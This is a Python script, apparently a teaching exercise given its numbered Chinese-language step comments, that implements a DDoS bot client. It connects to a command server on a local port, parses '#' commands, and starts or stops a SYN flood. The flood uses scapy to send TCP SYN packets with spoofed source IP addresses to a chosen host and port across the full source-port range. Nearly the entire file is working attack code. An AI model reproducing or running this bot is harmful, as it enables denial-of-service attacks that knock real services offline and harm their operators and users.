# -*- coding: utf-8 -*-
import sys
import random
import socket
import argparse
from multiprocessing import Process
from scapy.all import *

import os
isWorking = False
curProcess = None

# SYN flood attack
def synFlood(tgt,dPort):
    print('='*100)
    print('The syn flood is running!')
    print('='*100)
    srcList = ['201.1.1.2','10.1.1.102','69.1.1.2','125.130.5.199']
    for sPort in range(1024,65535):
        index = random.randrange(4)
        ipLayer = IP(src=srcList[index], dst=tgt)
        tcpLayer = TCP(sport=sPort, dport=dPort,flags="S")
        packet = ipLayer / tcpLayer 
        send(packet)

'''
3. 第三步
创建全部变量curProcess，用于判断是否有进程正在发起SYN泛洪攻击
循环等待接受命令，接收到的数据类型为byte型，需要对其进行解码，解码后才为字符串
'''
# Process Command
def cmdHandle(sock, parser):
    global curProcess
    # TODO
    count = 0
    while count <= 20:
        data = sock.recv(1024).decode('utf-8')
        # 接收到的数据长度为0，则跳过后续内容，重新接收;
        if len(data) == 0:
            print('The data is empty')
            return

        # 接收到的数据长度不为0，则判断是否有命令基本格式的特征#，满足则用ArgumentParser对象解析命令
        if data[0] == '#':
            try:
                # Parse Command
                options = parser.parse_args(data[1:].split())
                m_host = options.host
                m_port = options.port
                m_cmd = options.cmd

                '''
                4. 第四步
                判断命令参数解析后，是start命令还是stop命令
                首先，判断当前是否有进程在运行，如果有进程判断进程是否存活
                '''
                # DDoS Start Command
                if m_cmd.lower() == 'start':
                    # 如果当前有进程正在发起SYN泛洪攻击，我们就先结束这个进程，并清空屏幕，再启动一个进程
                    if curProcess != None and curProcess.is_alive():
                        # 结束进程
                        curProcess.terminate()
                        curProcess = None
                        os.system('clear')
                    print('The synFlood is already started')
                    p = Process(target=synFlood, args=(m_host, m_port))
                    p.start()
                    curProcess = p
                    # TODO
                    count = count+1

                # DDoS Stop Command
                elif m_cmd.lower() == 'stop':
                    if curProcess.is_alive():
                        curProcess.terminate()
                        os.system('clear')
            except:
                print('Failed to perform the command!')


'''
1. 第一步  
创建ArgumentParser对象，设置好需要解析的命令参数
'''
def main():
    p = argparse.ArgumentParser()
    p.add_argument('-H', dest = 'host', type = str)
    p.add_argument('-p', dest = 'port', type = int)
    p.add_argument('-c', dest = 'cmd', type = str)

    '''
    2. 第二步
    创建socket，连接服务器
    '''
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        ## 测试用，连接本地的58868端口
        s.connect(('127.0.0.1', 58868))
        print('To connect server was success!')
        print('=' * 50)
        cmdHandle(s, p)
    except:
        print('The network connected failed!')
        print('Please restart the script!')
        sys.exit(0)

if __name__ == "__main__":
    main()




